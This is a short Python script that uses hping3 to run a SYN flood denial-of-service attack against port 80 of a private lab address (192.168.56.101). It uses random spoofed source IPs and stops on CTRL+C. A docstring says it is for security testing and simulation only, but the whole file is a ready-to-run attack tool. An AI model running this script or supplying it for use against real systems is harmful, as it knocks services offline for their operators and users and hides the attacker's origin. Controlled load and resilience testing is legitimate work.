"""
This script automates a SYN Flood attack using hping3. It sends continuous TCP SYN packets to port 80 of the target IP (192.168.56.101) with random source IPs to simulate multiple attack sources. The attack runs asynchronously and can be stopped with CTRL+C, which terminates the hping3 process.
For security testing and simulation purposes only.
"""
import subprocess
import signal
import sys

# Define the hping3 command
command = ["hping3", "-S", "-p", "80", "--flood", "--rand-source", "192.168.56.101"]
process = None

def signal_handler(sig, frame):
    print("\n[!] CTRL+C detected, stopping hping3...")
    if process:
        process.terminate()
    sys.exit(0)

signal.signal(signal.SIGINT, signal_handler)

try:
    print("[*] Starting hping3 attack... Press CTRL+C to stop.")
    process = subprocess.Popen(command)
    process.wait()
except KeyboardInterrupt:
    signal_handler(None, None)
